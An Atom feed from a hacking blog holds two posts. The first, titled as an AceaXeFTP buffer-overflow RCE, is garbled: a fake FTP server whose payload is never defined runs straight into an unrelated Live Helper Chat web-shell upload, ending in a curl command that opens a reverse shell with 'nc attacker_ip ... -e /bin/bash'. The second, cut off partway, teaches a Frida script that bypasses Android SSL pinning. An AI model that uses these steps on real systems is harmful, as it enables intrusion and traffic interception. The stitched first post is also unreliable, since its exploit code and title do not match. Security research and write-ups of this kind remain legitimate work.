<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-11-13T15:55:58-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hacking related blog</title><subtitle>This blog is about cybersecurity related stuff, such as Bug Bounty, Penetration Testing, CTFs, etc.</subtitle><entry><title type="html">RCE via Buffer Overflow - AceaXeFTP</title><link href="http://localhost:4000/cve_research/AceaXeftp-RCE-Via-Buffer-Overflow/" rel="alternate" type="text/html" title="RCE via Buffer Overflow - AceaXeFTP" /><published>2019-11-11T00:00:00-03:00</published><updated>2019-11-11T00:00:00-03:00</updated><id>http://localhost:4000/cve_research/AceaXeftp-RCE-Via-Buffer-Overflow</id><content type="html" xml:base="http://localhost:4000/cve_research/AceaXeftp-RCE-Via-Buffer-Overflow/">&lt;p&gt;&lt;strong style=&quot;color: greenyellow&quot;&gt;RCE via Buffer Overflow - AceaXeFTP&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;summary&quot;&gt;Summary:&lt;/h1&gt;
&lt;p&gt;It’s Possible to trigger a buffer overflow, in AceaXeFTP client, by hosting a malicious ftp server and sending malicious responses to the client.&lt;/p&gt;

&lt;h1 id=&quot;bin-info&quot;&gt;Bin info:&lt;/h1&gt;
&lt;p&gt;Name: AceaXe +
Homepage: http://www.labf.com/aceaxeplus/index.html&lt;/p&gt;

&lt;h1 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h1&gt;

&lt;p&gt;Studying to take the OSCE exam, i was simply fascinated by the Exploit dev topic, ASLR Bypass and SEH based exploits, was something that i needed to see in the internet jungle.
 &lt;/p&gt;

&lt;p&gt;Doing the exercises, i was able to successfuly exploit one of the examples. So, i thought “Yeah, it’s time to find a really old software that i could run in a windows vista and try to find some AAAA shenanigans”, and that’s what i did, got first a windows xp and windows vista vm running and the AceaXe software bundle installed.
 &lt;/p&gt;

&lt;p&gt;First, as i was really confortable with the basics of exploit dev, because of the OSCP background, i tried finding something in the windows xp, as it would not have ASLR nor DEP, so it would be easy to exploit. 
 &lt;/p&gt;

&lt;p&gt;As i was researching i found a lot of PoCs of ftp clients that got exploited by sending the response of the ftp commands with the exploit code. so, after some hours of trying a lot of gui overflows and file sizes oveflows, I finnally tried creating my own fake FTP server in python and sending the famous EHLO response with a giant string &amp;amp;afterwords, and it worked, EIP was finnaly overwritten by the AAAAs ! 
 &lt;/p&gt;

&lt;h1 id=&quot;finnally--time-to-exploit-winxp-version&quot;&gt;Finnally ! Time to exploit (winXP version):&lt;/h1&gt;

&lt;p&gt;The concept was easy. Create a simple socket listening to port 21, that sends the string after the client connects to it.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;                   
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;              
&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;            
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                     
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Ouvindo na porta 21.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[-] Problemas no socket, veja se a porta 21 ja esta sendo utilizada'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Envindo o payload'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     
	    &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dadosenviados&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Chegou tua shell na porta 6666'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[-] Tivemos um prolema, veja se tudo foi settado corretamente'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Upon first inspection, there are no themes currently uploaded on the web application. The first step would be to try and upload a PHP file directly in one of the file inputs, however this does not seem to work in our case.&lt;/p&gt;

&lt;p&gt;In order to exploit this vulnerability, we must first create basic theme. Let’s move to the vulnerable directory.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong style=&quot;color: red&quot;&gt;/lhc_web/index.php/site_admin/abstract/new/WidgetTheme&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We fill up the required inputs and parameters with dummy data. Then, we go back and download the theme from the Widget directory located here:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong style=&quot;color: red&quot;&gt;/lhc_web/index.php/site_admin/abstract/edit/WidgetTheme/1&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When the file is downloaded, we open it and modify the &lt;strong&gt;offline_image_data parameter&lt;/strong&gt; as well as the &lt;strong&gt;offline_image_data_ext&lt;/strong&gt; parameter
 &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; base64(Image Header + PHP Web Shell)
 &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Offline_image_data&lt;/strong&gt; is replaced with the payload.
&lt;strong&gt;Offline_image_data_ext&lt;/strong&gt; is simply set to “php”.
 &lt;/p&gt;

&lt;p&gt;The exploit should look something like this:
 &lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name_company&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Peter Winter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;..[SNIP]..&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;..[SNIP]..&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;offline_image_data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base64_payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;offline_image_data_ext&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt; 
After the theme with the exploit is prepared it is uploaded on the web server in the following page:
16px&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong style=&quot;color: red&quot;&gt;/lhc_web/index.php/site_admin/theme/import&lt;/strong&gt;
 &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image1.png&quot; alt=&quot;import theme&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;After the upload is successful, the user must edit the imported theme at the Widget themes section. When the page is loaded, so is the php web shell. In our case, we have identified the path where the shell has been uploaded by viewing the page source and viewing the file path of the &lt;strong&gt;offline_image_data&lt;/strong&gt; parameter:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong style=&quot;color: red&quot;&gt;/lhc_web/var/storagetheme/2018y/06/03/2/2c36ce9c8ebb012be3bcb3acb60abbc3.php&lt;/strong&gt;
 &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Our webshell can execute code on the server by using “cmd” as a parameter. The user can then proceed to set up a reverse shell to their machine by using nc. We then proceed to establishing a reverse shell connection by issuing the following command through the GET method. Firstly, we start a listener on our local machine.
 &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 60000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Then, we proceed to send a GET request to the webserver by leveraging our PHP web shell.
 &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;
http://victim_ip/lhc_web/var/storagetheme/2018y/06/03/2/2c36ce9c8ebb012be3bcb3acb60abbc3.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nc+attacker_ip+60000+-e+/bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;If the connection is successful, we should get the following message on our listener. Upon issuing the id command, we find out that we are logged in as the www-data user.
 &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 60000
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 60000 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;attacker_ip] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;vitim_ip] 40248
&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;some-of-the-recommendations-for-remediating-this-vulnerability-are-listed-below&quot;&gt;Some of the recommendations for remediating this vulnerability are listed below:&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Restrict file types accepted for upload (check the file extension and only allow certain files to be uploaded.)&lt;/li&gt;
  &lt;li&gt;Use a whitelist approach instead of a blacklist.&lt;/li&gt;
  &lt;li&gt;Check for double extensions such as .php.png.&lt;/li&gt;
  &lt;li&gt;Check for files without a filename like .htaccess (on ASP.NET, check for configuration files like web.config).&lt;/li&gt;
  &lt;li&gt;Change the permissions on the upload folder so the files within it are not executable. If possible, rename the files that are uploaded.&lt;/li&gt;
  &lt;li&gt;Check OWASP page for unrestricted upload for the rest of best-practice solutions.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;vulnerability-found-by&quot;&gt;Vulnerability found by:&lt;/h1&gt;
&lt;p&gt;Me and &lt;a href=&quot;https://twitter.com/0xcela&quot;&gt;0xcela&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">RCE via Buffer Overflow - AceaXeFTP</summary></entry><entry><title type="html">Configuring Frida with BurpSuite and Genymotion to bypass SSL Pinning</title><link href="http://localhost:4000/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/" rel="alternate" type="text/html" title="Configuring Frida with BurpSuite and Genymotion to bypass SSL Pinning" /><published>2019-11-11T00:00:00-03:00</published><updated>2019-11-11T00:00:00-03:00</updated><id>http://localhost:4000/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning</id><content type="html" xml:base="http://localhost:4000/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/">&lt;h2 id=&quot;configuring-frida-with-burpsuite-and-genymotion-to-bypass-android-ssl-pinning&quot;&gt;Configuring Frida with BurpSuite and Genymotion to bypass Android SSL Pinning&lt;/h2&gt;

&lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;
&lt;p&gt;If you are into Bug Bounty programs and you are not looking into their mobile apps, then you are missing a lot of juicy stuff. Yeah it’s ok to use automated scanners but 90% of these scanners only do static analysis. By doing dynamic analysis on a mobile app we have the chance to discover high severity bugs such as authentication and authorization flaws, content spoofing, memory leaks, application logic flaws, and cross-site scripting. In modern mobile apps there is a technique implemented and it’s named SSL Pinning. This technique is used in the client side to avoid man-in-the-middle attack by validating the server certificates again even after SSL handshaking. This can be bypassed using different techniques but in this blog we are going to use Frida and BurpSuite, because it’s easier and faster.&lt;/p&gt;

&lt;h1 id=&quot;requirements&quot;&gt;Requirements:&lt;/h1&gt;
&lt;p&gt; &lt;/p&gt;

&lt;p&gt;BurpSuite Community or Pro
&lt;strong&gt;https://portswigger.net/burp&lt;/strong&gt;
 &lt;/p&gt;

&lt;p&gt;Frida
&lt;strong&gt;pip install Frida&lt;/strong&gt;
&lt;strong&gt;pip install frida-tools&lt;/strong&gt;
 &lt;/p&gt;

&lt;p&gt;Genymotion + Virtual Box
&lt;strong&gt;https://www.genymotion.com/&lt;/strong&gt;
&lt;strong&gt;https://www.virtualbox.org/&lt;/strong&gt;
 &lt;/p&gt;

&lt;h1 id=&quot;steps&quot;&gt;Steps:&lt;/h1&gt;
&lt;p&gt;After you create a GenyMotion account, you can procced to install your device with custom OS. For this writeup we are going to use Galaxy S9 with android 9.0 and bridged networking like it’s shown in the image below.
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image6.png&quot; alt=&quot;image6&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;By default BurpSuite proxy listens on &lt;strong&gt;127.0.0.1:8080&lt;/strong&gt;, we should change this to listen on a different interface that can be accessed from other devices in your network. I will configure it to listen on interface &lt;strong&gt;192.168.0.84&lt;/strong&gt; and port &lt;strong&gt;8080&lt;/strong&gt; like it’s shown in the image below.
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image7.png&quot; alt=&quot;image7&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;In order to intercept traffic with BurpSuite we need to export its certificate and then install it in our android device. The default extension is &lt;strong&gt;.der&lt;/strong&gt; but our android device accepts only &lt;strong&gt;.cer&lt;/strong&gt; format, so while exporting make sure to save it as &lt;strong&gt;cacert.cer&lt;/strong&gt;. 
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image8.png&quot; alt=&quot;image8&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;Before configuring proxy on our android device, we should edit proxy settings on GenyMotion too.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Settings -&amp;gt; Network -&amp;gt; Use HTTP Proxy -&amp;gt; 127.0.0.1:8080&lt;/strong&gt;
 &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image9.png&quot; alt=&quot;image9&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;Genymotion has it’s own adb tools included that operate only with the devices running on its emulator. In my system these tools are located on &lt;strong&gt;/opt/genymotion/tools/&lt;/strong&gt;, if it’s not the same location in your system, you can search with the command below.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;find / -type d -name “genymotion” 2&amp;gt;/dev/null&lt;/strong&gt;
 &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now we can proced to install the cacert.cer in our device. We can use adb tools to upload it then manually install it.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;$ /opt/genymotion/tools/adb push ~/Downloads/cacert.cer /sdcard/Download/&lt;/strong&gt;
 &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Navigate to &lt;strong&gt;Settings&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Security &amp;amp; Location&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Encryption &amp;amp; Credentials&lt;/strong&gt;
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image10.png&quot; alt=&quot;image10&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;Click on &lt;strong&gt;Install from SD Card&lt;/strong&gt; and locate &lt;strong&gt;cacert.cer&lt;/strong&gt; (We earlier put it into /sdcard/Download/)
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image11.png&quot; alt=&quot;image11&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;Then you can name it how you want, in my case I’ll name it &lt;strong&gt;burp&lt;/strong&gt;.
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image12.png&quot; alt=&quot;image12&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;The last thing left to configure on our device is the wifi proxy, we can do that following the images below.
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image13.png&quot; alt=&quot;image13&quot; class=&quot;images&quot; /&gt;
 
&lt;img src=&quot;/assets/images/image14.png&quot; alt=&quot;image14&quot; class=&quot;images&quot; /&gt;
 
&lt;img src=&quot;/assets/images/image15.png&quot; alt=&quot;image15&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;Burp and Genymotion are configured, it’s only frida left. 
&lt;strong&gt;But what does Frida exactly do?&lt;/strong&gt; Frida lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, Android, and QNX. It also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API.
 
For this writeup we will use &lt;a href=&quot;https://codeshare.frida.re/@sowdust/universal-android-ssl-pinning-bypass-2/&quot; style=&quot;color: red&quot;&gt;this&lt;/a&gt; javascript file as bypass.
 &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* 
   Universal Android SSL Pinning Bypass
   by Mattia Vinci and Maurizio Agazzini 
*/&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;perform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;array_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;java.util.ArrayList&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ApiClient&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;com.android.org.conscrypt.TrustManagerImpl&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;ApiClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;checkTrustedRecursive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;implementation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// console.log('Bypassing SSL Pinning');&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;array_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;In order for your machine and android device to communicate, there is a frida-server that we should put into /data/local/tmp/.
 
If you go to &lt;a href=&quot;https://github.com/frida/frida/releases&quot; style=&quot;color: red&quot;&gt;this&lt;/a&gt; repo, you’ll see that there are different servers made for specific arch-s.
 &lt;/p&gt;

&lt;p&gt;It’s easy to determine what server we should use. By executing the command below, we can identify our android device architecture.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;$ /opt/genymotion/tools/adb shell getprop ro.product.cpu.abi&lt;/strong&gt;&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;&lt;strong style=&quot;color: red&quot;&gt;x86&lt;/strong&gt;
 &lt;/p&gt;
  &lt;/blockquote&gt;
